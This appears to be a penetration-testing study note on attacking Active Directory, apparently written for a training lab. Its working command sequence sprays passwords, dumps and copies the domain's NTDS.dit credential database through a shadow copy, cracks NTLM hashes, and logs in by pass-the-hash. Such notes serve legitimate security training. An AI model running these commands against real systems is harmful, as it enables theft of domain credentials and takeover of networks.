# Attacking AD & NTDS.dit

***

On Windows Server operating systems, the file that stores the password hashes of all domain accounts on a domain controller is typically named "_NTDS.dit_." This file is located in the "C:\Windows\NTDS" directory. NTDS stands for NT Directory Service, which is the core component of Active Directory.

```bash
crackmapexec smb 10.129.201.57 -u user -p /usr/share/wordlists/rockyou.txt
```

## NTDS.dit

```bash
crackmapexec smb 10.129.201.57 -u user -p P@55w0rd! --ntds
```

### Another way

```bash
evil-winrm -i 10.129.201.57  -u user -p 'P@55w0rd!'
```

#### Checking Local Group Membership

```powershell
*Evil-WinRM* PS C:\> net localgroup
```

To make a copy of the NTDS.dit file, we need local admin (Administrators group) or Domain Admin (Domain Admins group) (or equivalent) rights.

```powershell
*Evil-WinRM* PS C:\> net user username
```

#### Create Shadow copy of C:

```powershell
*Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:
```

#### Copying NTDS.dit from VSS

```powershell
*Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```

## Cracking Hashes

```bash
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```

## Pass-the-hash

We can still use hashes to attempt to authenticate with a system using a type of attack called Pass-the-Hash (PtH). A PtH attack takes advantage of the NTLM authentication protocol to authenticate a user using a password hash. Instead of username:clear-text password as the format for login, we can instead use username:password hash.

```bash
evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"
```
